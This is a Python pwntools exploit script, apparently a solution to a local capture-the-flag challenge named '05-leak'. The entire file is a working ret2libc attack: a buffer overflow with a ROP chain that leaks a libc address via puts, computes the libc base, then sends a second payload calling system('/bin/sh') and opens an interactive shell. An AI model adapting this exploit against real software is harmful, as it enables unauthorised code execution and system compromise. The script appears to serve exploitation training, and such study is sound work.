#!/usr/bin/env python3
from pwn import *

p = process('/challenges/05-leak/target', stderr=2)
# p = process(['/challenges/04-system/target'])
e = ELF('/challenges/05-leak/target')
# libc = ELF(p.libc.path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print("Libc path: ", libc)

p.readline()
pop_rdi_ret = 0x0000000000401263
pop_r15_ret = 0x0000000000401262
ret_gadjet = 0x0000000000401016

payload = b"A" * 0x80
payload += b"B" * 0x08
payload += p64(pop_rdi_ret)
payload += p64(e.got['__libc_start_main'])
payload += p64(e.symbols['puts'])
payload += p64(e.symbols['_start'])

print(payload)
p.send(payload)
libc_start_main_str = p.readline()
print(libc_start_main_str)
libc_start_main = u64(libc_start_main_str.strip().ljust(8, b'\x00'))
print(hex(libc_start_main))

libc_base = libc_start_main - libc.symbols['__libc_start_main']
print("LIBC_BASE: 0x%x" % libc_base)

# libc.address = libc_base
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.symbols['system']

print("Leaked libc_start_main address:", hex(libc_start_main))
print("Libc base address:", hex(libc_base))
print("System address:", hex(system_addr))
print("'/bin/sh' address:", hex(bin_sh_addr))


payload_2nd = b'A' * 0x80
payload_2nd += b'B' * 8
payload_2nd += p64(pop_rdi_ret)
payload_2nd += p64(bin_sh_addr)
payload_2nd += p64(ret_gadjet)
payload_2nd += p64(system_addr)

with open("payload_2nd.bin", "wb") as f:
    f.write(payload_2nd)
pause()

p.send(payload_2nd)

p.interactive()